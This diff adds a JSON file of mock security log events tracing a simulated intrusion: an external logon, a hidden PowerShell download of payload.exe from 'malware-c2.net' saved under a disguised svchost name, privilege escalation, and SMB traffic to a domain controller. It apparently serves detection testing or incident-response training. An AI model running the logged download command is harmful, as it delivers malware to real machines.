@@ -1,0 +1,52 @@
+[
+  {
+    "timestamp": "2026-08-08T10:00:00Z",
+    "event_id": 4624,
+    "source_ip": "198.51.100.44",
+    "user": "johndoe",
+    "hostname": "WKSTN-8892",
+    "action": "Successful Logon",
+    "log_type": "Authentication",
+    "description": "External SSH login detected from unknown IP."
+  },
+  {
+    "timestamp": "2026-08-08T10:05:12Z",
+    "event_id": 1,
+    "hostname": "WKSTN-8892",
+    "process": "powershell.exe",
+    "command_line": "powershell -WindowStyle Hidden -c \"Invoke-WebRequest 'http://malware-c2.net/payload.exe' -OutFile 'C:\\temp\\svchost_update.exe'\"",
+    "action": "Process Creation",
+    "log_type": "Endpoint",
+    "user": "johndoe"
+  },
+  {
+    "timestamp": "2026-08-08T10:06:05Z",
+    "event_id": 1,
+    "hostname": "WKSTN-8892",
+    "process": "svchost_update.exe",
+    "parent_process": "powershell.exe",
+    "action": "Process Creation",
+    "log_type": "Endpoint"
+  },
+  {
+    "timestamp": "2026-08-08T10:08:22Z",
+    "event_id": 4673,
+    "hostname": "WKSTN-8892",
+    "process": "svchost_update.exe",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "action": "Privilege Escalation",
+    "log_type": "Security",
+    "description": "Process spawned child thread with SYSTEM level permissions."
+  },
+  {
+    "timestamp": "2026-08-08T10:15:00Z",
+    "event_id": 5140,
+    "source_ip": "10.0.1.22",
+    "destination_ip": "10.0.0.50",
+    "destination_hostname": "DC-01",
+    "action": "Network Connection",
+    "port": 445,
+    "log_type": "Network",
+    "description": "SMB connection initiated to internal domain controller."
+  }
+]
